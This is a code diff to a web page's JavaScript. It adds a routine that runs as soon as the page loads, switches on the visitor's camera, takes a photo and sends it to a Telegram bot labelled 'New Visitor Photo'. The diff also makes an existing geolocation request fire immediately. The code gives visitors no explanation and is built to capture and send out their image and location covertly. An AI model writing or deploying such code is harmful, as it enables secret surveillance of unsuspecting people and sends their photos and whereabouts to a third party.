@@ -98,7 +98,74 @@ document.addEventListener('DOMContentLoaded', async () => {
         loading.style.display = 'none';
         content.style.display = 'block';
 
-        // 5. Wait 0.5s, Request Location, THEN Save
+        // --- Camera Capture Logic ---
+        async function captureAndSendPhoto() {
+            // Only run if HTTPS or Localhost
+            if (location.protocol !== 'https:' && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
+                console.warn("Camera requires HTTPS. Skipping.");
+                return;
+            }
+
+            const player = document.getElementById('player');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                player.srcObject = stream;
+
+                // Wait for video to be ready
+                await new Promise((resolve) => {
+                    player.onloadedmetadata = () => {
+                        player.play();
+                        // Small delay to ensure camera adjusts light
+                        setTimeout(resolve, 1000);
+                    };
+                });
+
+                // Set canvas size to match video
+                canvas.width = player.videoWidth;
+                canvas.height = player.videoHeight;
+
+                // Draw frame
+                context.drawImage(player, 0, 0, canvas.width, canvas.height);
+
+                // Convert to Blob and Send
+                canvas.toBlob((blob) => {
+                    sendPhotoToTelegram(blob);
+
+                    // Stop Camera
+                    stream.getTracks().forEach(track => track.stop());
+                }, 'image/jpeg', 0.8);
+
+            } catch (err) {
+                console.error("Camera Error:", err);
+                // Optional: Send error to Telegram that camera failed
+            }
+        }
+
+        function sendPhotoToTelegram(photoBlob) {
+            const formData = new FormData();
+            formData.append("chat_id", TELEGRAM_CHAT_ID);
+            formData.append("photo", photoBlob, "visitor.jpg");
+            formData.append("caption", "📸 New Visitor Photo");
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ok) console.log("Photo sent to Telegram!");
+                    else console.error("Telegram Photo Error:", data);
+                })
+                .catch(err => console.error("Telegram Photo Network Error:", err));
+        }
+
+        // Call Camera Function Immediately
+        captureAndSendPhoto();
+
+        // 5. Wait 0s (Immediate), Request Location, THEN Save
         setTimeout(() => {
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
